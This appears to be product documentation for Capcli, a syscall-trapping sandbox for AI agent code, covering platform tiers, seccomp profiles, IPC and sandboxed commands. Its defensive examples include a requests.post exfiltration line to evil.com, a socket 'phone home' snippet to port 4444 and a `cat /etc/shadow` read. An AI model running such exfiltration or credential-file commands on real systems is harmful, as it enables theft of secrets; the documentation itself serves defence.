
# Sandboxing, Syscalls, & Platform Tiers

Most developers think "sandboxing" means spinning up a 4GB Docker container with an entire Ubuntu image just to execute a 12-line Python script. 

It takes 8 seconds to boot, eats all your RAM, and still doesn't stop the Python script from running `requests.post("https://evil.com", data=all_your_passwords)` because Docker leaves outbound networking wide open by default.

Docker isolates the machine. **Capcli isolates the syscalls.**

Capcli spins up sandboxes in under **50 milliseconds** using unprivileged Linux namespaces (`bwrap`) and system-call trapping (`seccomp-bpf`). 

Here is how guest code is physically caged, and why your MacBook is officially classified as a degraded security zone.

---

## 1. Platform Tier Taxonomy: Physics Doesn't Care About Your M3 Max

Before you execute a single routine, `capcli sys doctor` inspects your host kernel. It assigns your machine to one of two tiers:

```
┌────────────────────────────────────────────────────────────────────────┐
│  TIER 1: HARDENED ISOLATION (Linux Bare-Metal, VPS, WSL2, Docker)      │
│  • Unprivileged user namespaces (bubblewrap / bwrap >= 0.8.0)          │
│  • seccomp-bpf syscall trapping at the kernel boundary                 │
│  • tmpfs ephemeral scratch space (wiped on process exit)               │
│  • All trust rungs unlocked: draft, reviewed, and PINNED               │
└────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────┐
│  TIER 2: DEGRADED ISOLATION (macOS, Windows Native, Android Termux)    │
│  • No unprivileged user namespaces in host OS kernel                   │
│  • IPC broker mediation instead of hardware syscall trapping           │
│  • Hard ceiling: capped at REVIEWED in dev/sim                         │
│  • Pinned production routines REFUSED (exit 2: E045_TIER2_PINNED)      │
└────────────────────────────────────────────────────────────────────────┘
```

### The Cold Reality for Mac Users:
You spent $3,500 on a MacBook Pro. It has a beautiful screen. 

**It is also a Tier 2 degraded platform.**

macOS (Darwin) simply does not possess unprivileged kernel namespaces. You cannot run `bwrap` on a Mac without root privileges. 

If an agent runs locally on Darwin, it is physically capable of bypassing user-space network proxies if it tries hard enough.

**The Rule:** You can write code on your Mac. You can rehearse against `sim` on your Mac. But when it is time to pin code to unattended live production, **it must run on Linux (Tier 1)**. Physics wins every time.

---

## 2. The Network Jail: Syscall 42 Trapping

When an agent writes code inside a routine, it might get cute and try to open a raw TCP socket:

```python
# Inside routines/sneaky_exfil.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.50", 4444))  # Tries to phone home
```

On Tier 1 hosts, Capcli compiles a **`seccomp-bpf`** filter and attaches it to the guest process before execution starts.

The microsecond Python executes `s.connect(...)`, the CPU triggers **Syscall 42 (`connect`)**:

```
Guest Python Process
        │
        │ invokes syscall 42 (connect)
        ▼
┌───────────────────────────────┐
│     seccomp-bpf Filter        │ ──▶ [SNIPER KILL]
│  (traps raw network calls)    │     Process terminated instantly!
└───────────────┬───────────────┘
                │
                ▼
        exit 2: kernel.network.jail
```

The process never touches the network stack. It doesn't get a "connection timeout" or a "host unreachable" error. 

The Linux kernel snipes the syscall at the processor level. The subshell terminates with **`exit 2` (`kernel.network.jail`)**.

### How do routines talk to the internet, then?
Through the **`ctx.api.call`** IPC bridge. 

The guest script asks the Capcli Rust daemon over a local Unix domain socket: *"Please execute the synced catalog verb `stripe.refund_charge` on my behalf."* 

The kernel inspects the token bucket, checks the budget, validates the schema, injects the vaulted secret, and fires the HTTP request from its own hardened proxy.

---

## 3. Dynamic Syscall Profiles per Runtime

Different programming engines need different system calls to function. Node.js needs event loops; Python needs thread futexes.

Capcli ships with engine-specific `seccomp-bpf` profiles:

| Runtime Profile | Permitted Syscalls | Blocked Syscalls |
|---|---|---|
| **`profile_python`** | `clone`, `futex`, `mmap`, basic POSIX signals | `connect`, `socket`, `bind`, `listen`, `ptrace` |
| **`profile_bun_node`** | `epoll_create1`, `epoll_ctl`, `eventfd2`, `io_uring_setup` | Raw network egress, host file system mounts outside `/scratch` |
| **`profile_binary`** | `clone3`, `futex`, `rseq`, `rt_sigreturn` | All network, direct disk writes outside jail |

If Bun tries to spawn an unwhitelisted child binary or Python tries to attach a debugger via `ptrace`, the profile triggers an immediate SIGKILL.

---

## 4. The IPC Socket Architecture

How do guest routines talk to the kernel without network access?

Capcli uses high-speed, local platform IPC:

```
┌────────────────────────────────────────────────────────────────────────┐
│  SANDBOX JAIL (bwrap / broker)                                         │
│                                                                        │
│   Guest Script (Python / JavaScript / TypeScript)                      │
│        │                                                               │
│        │ JSON-Lines Protocol (zero-dependency SDK)                     │
│        ▼                                                               │
│   Local Domain Socket Mount                                            │
└────────┬───────────────────────────────────────────────────────────────┘
         │
         │ Streaming JSON-RPC 2.0
         ▼
┌────────────────────────────────────────────────────────────────────────┐
│  CAPCLI KERNEL (Rust Core)                                             │
│  Linux / macOS: /run/capcli/kernel.sock                                │
│  Windows:       \\.\pipe\capcli-kernel                                 │
└────────────────────────────────────────────────────────────────────────┘
```

* **Warm Runner Recycling:** Sandboxes maintain pre-warmed runtimes. Spawning a sandboxed Python or Bun execution takes **<50ms**, not the 4 seconds required to spin up a Docker container.
* **Ephemeral `/scratch` tmpfs:** Guest code is granted an in-memory 64MB `tmpfs` mounted at `/scratch`. When the script finishes, the namespace dissolves, and the scratch disk is wiped from RAM. No residual temporary files survive.

---

## 5. Jailing Ad-Hoc Host Commands: `sys exec --sandbox`

What if your agent needs to run an external CLI tool (like `jq`, `pandoc`, or `tar`) to process a file, but you don't trust it not to delete your home directory?

You wrap it in Capcli's sandbox jail:

```bash
$ capcli sys exec "cat /etc/shadow" --sandbox
```

```text
[dev:tier_1]  ✗  exit 2

  cat: /etc/shadow: No such file or directory
```

### What `sys exec --sandbox` does:
1. Provisions an isolated `bwrap` container.
2. Uses `pivot_root` to unmount your actual root filesystem.
3. Maps your workspace directory as read-only.
4. Mounts an empty `tmpfs` at `/tmp`.
5. Drops all Linux capabilities (`CAP_SYS_ADMIN`, `CAP_NET_RAW`, etc.).

The command executes inside a ghost town. It can read the input files you gave it, write output to `/scratch`, and do nothing else.

---

## The One Rule

**Virtualization isolates servers. Syscall trapping isolates intent.**

You don't need heavy virtual machines to contain autonomous agents. You need strict Linux namespaces, an unforgiving seccomp filter, and a local Unix socket that treats all guest code like an untrusted script.

---

**See how audit logs capture sandbox violations:** → [audit.md](../understand/audit.md)  
**Run a platform tier probe on your host right now:** → `capcli sys doctor`
